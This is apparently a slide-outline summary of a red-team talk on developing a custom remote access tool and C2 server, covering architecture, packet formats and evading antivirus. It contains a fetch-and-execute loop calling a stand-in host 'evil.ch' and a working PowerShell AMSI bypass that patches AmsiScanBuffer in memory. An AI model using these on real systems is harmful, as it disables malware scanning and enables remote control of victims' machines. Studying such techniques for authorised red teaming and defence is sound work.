# RAT Development Overview

## Introduction
- **Date:** 06/01/2022
- **Presenter:** Dobin Rutishauser (@dobinrutis)
- **Link:** [Presentation Link](https://bit.ly/3Qg219P)

## About the Presenter
- **Developer // TerreActive**
- **Pentester // Compass Security**
- **Developer // UZH**
- **SOC Analyst // Infoguard**
- **RedTeam Lead // Raiffeisen**

### Presentations and Contributions
- **SSL/TLS Recommendations** - OWASP Switzerland
- **Burp Sentinel - Semi Automated Web Scanner** - BSides Vienna
- **Automated WAF Testing and XSS Detection** - OWASP Switzerland Barcamp
- **Fuzzing For Worms - AFL For Network Servers** - Area 41
- **Memory Corruption Exploits & Mitigation** - BFH Berner Fachhochschule
- **Gaining Access** - OST Ostschweizer Fachhochschule

## Red Teaming and Scope
- **Objective:** Realistically test overall security posture.
- **Not a Pentest!**
- **Simulate adversaries (CTI)**
- **Focus on TTPs (Tools, Techniques, Procedures)**
- **Less focus on vulnerabilities**
- **Credential stealing, lateral movement, data exfiltration**
- **Testing the BlueTeam / SOC**
- **PurpleTeaming**
- **Reference Talk:** "Building a Red Team" by Daniel Fabian

## Target Environment
- **Client Workstation**
- **HTTP Server**
- **HTTP Proxy**
- **Antivirus**
- **EDR**
- **Sysmon**
- **SIEM/SOAR**
- **Sandbox**
- **Domain Reputation**
- **Content Filter**
- **No admin privileges**
- **SOC monitoring**
- **Internet access via authenticated HTTP proxy**

## What is a RAT?
- **Remote Access Tool (RAT)**
- **Components:**
  - **Client (Implant)**
  - **Beacon**
  - **C2 (Command & Control)**
  - **Example:** `RAT.exe`

## Why Write a RAT?
- **Common tools like CobaltStrike are widely detected.**
- **Custom RATs can evade detection.**

## In Scope and Out of Scope
- **In Scope:**
  - Execute RAT
  - Execute Tools
- **Out of Scope:**
  - Reconnaissance
  - Exploitation
  - Lateral movement
  - Privilege escalation

## RAT Development Principles
- **Keep It Simple, Stupid (KISS)**

### Example Code
```python
while True:
    curl evil.ch/getCommand > exec && ./exec
```

## Antnium
- **"Anti-Tanium" (now also Anti-Defender)**
- **GitHub Repositories:**
  - [Antnium](https://github.com/dobin/antnium) (300+ commits)
  - [Antnium UI](https://github.com/dobin/antnium-ui) (200+ commits)

## Programming Languages
- **Native Languages:**
  - C, C++, NIM, Zig
  - Go, Rust, Hare
- **Managed Languages:**
  - PowerShell, C#
- **Go Features:**
  - Compiled
  - Garbage collection
  - Cross-compiling (Windows, Linux)
  - Large RedTeaming ecosystem
  - Can compile as DLL

## Communication Channel
- **Use HTTPS:**
  - Simple
  - Reliable
  - Always available
  - Hard to monitor
  - Endpoints: `/getCommand` and `/sendAnswer`
  - C2 obfuscation not in scope

### HTTP Communication Channel
- **Components:**
  - C2
  - RAT
  - Operator UI
  - Database

### Packet Structure
```json
{
    "clientid": "c88ld5qsdke1on40m5a0",
    "packetid": "59650232820019",
    "packetType": "exec",
    "arguments": {
        "commandline": "hostname",
        "shelltype": "cmd"
    },
    "response": {},
    "downstreamId": "client"
}
```

## C2 Infrastructure Architecture
- **Trusted Components:**
  - C2 Server
  - RAT
  - Forwarders (e.g., EC2, GCP)
  - Reverse Proxy
  - Client Key
  - UI
  - Git

### Campaign Configuration
```json
{
    "ApiKey": "secretKeyOperator",
    "EncKey": "secretKeyClient",
    "ServerUrl": "c2.notavirus.ch",
    "PacketSendPath": "/send",
    "PacketGetPath": "/get/",
    "FileUploadPath": "/upload/",
    "FileDownloadPath": "/static/",
    "ClientWebsocketPath": "/ws",
    "AuthHeader": "X-Session-Token",
    "UserAgent": "Go-http-client/1.1"
}
```

## Websocket Communication Channel
- **Benefits:**
  - Instant
  - Stealthy
- **Challenges:**
  - Architecture
  - Client connectivity
  - Reconnects, downgrades, upgrades
  - Goroutines and channels

## Command Execution
- **Commands:**
  - `net.exe`, `ipconfig`, `wmic`, and other LOLBins
  - `cmd.exe` and `powershell.exe` command lines
  - Persistent shell

### Dev Problems with Execution
- **Arguments Handling:**
  - `commandline = “net user dobin”`
  - `commandline = []string{“net”, “user”, “dobin”}`
  - `commandline = “c:\program files\test.exe”`
- **Capturing Stdout/Stderr**
- **Managing long-lasting processes**

## UI/UX
- **Principles:**
  - Intuitive
  - Reliable
  - Effective
  - Every feature needs a UI
- **Dev Challenges:**
  - Angular, TypeScript, RXJS
  - Re-implement server functionality
  - Managing packet streams and notifications

### File Browser, Upload, Download
- **Demo:**
  - ID T1105: Command and Control: Ingress Tool Transfer
  - ID T1020: Exfiltration: Automated Exfiltration
  - ID T1048.001: Exfiltration: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

## Reliability and Robustness
- **Testing:**
  - Unittests
  - Integration Tests
  - REST and Websocket Tests
  - Client-Server Tests
  - Refactoring
  - Reconnection Tests
  - Proxy Tests
  - Command Execution Tests

## Defeating the AV
- **Signature Scanning:**
  - No signatures (FUD)
- **Heuristics:**
  - Avoid importing too much functionality
  - Use dynamic imports, D/Invoke
- **Sandbox:**
  - RAT waits for commands
  - Detect sandbox and exit
  - Calculate primes
- **AMSI:**
  - Not applicable for non-.NET/Powershell

## Red Team Tools
- **PE EXE/DLL, Unmanaged:**
  - Mimikatz
  - Dumpert
- **.NET/C#, Managed:**
  - Rubeus
  - Seatbelt
  - SharpHound
  - SharpSploit
  - SharpUp
  - SharpView
- **Powershell:**
  - ADRecon
  - PowerSploit (obsolete)
  - Load .NET in process
  - AMSI bypass
  - Obfuscation and download
  - Reflective PE loader
  - Process injection shellcode
  - Obfuscation
  - AMSI bypass: amsi.fail

### Executing Managed Code
- **Loading Managed Code:**
  ```csharp
  CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&metaHost);
  metaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
  runtimeInfo->GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost, (LPVOID*)&runtimeHost);
  runtimeHost->Start();
  HRESULT res = runtimeHost->ExecuteInDefaultAppDomain(L"C:\\labs\\bin\\Debug\\CLRHello1.exe", L"CLRHello1.Program", L"spotlessMethod", L"test", &pReturnValue);
  ```

- **AMSI Bypass:**
  ```powershell
  $LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
  $Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
  $p = 0
  [Win32]::VirtualProtect($Address, 5, 0x40, [ref]$p)
  $Patch = (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
  [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
  ```

This document provides a comprehensive overview of RAT development, including the necessary components, best practices, and common challenges.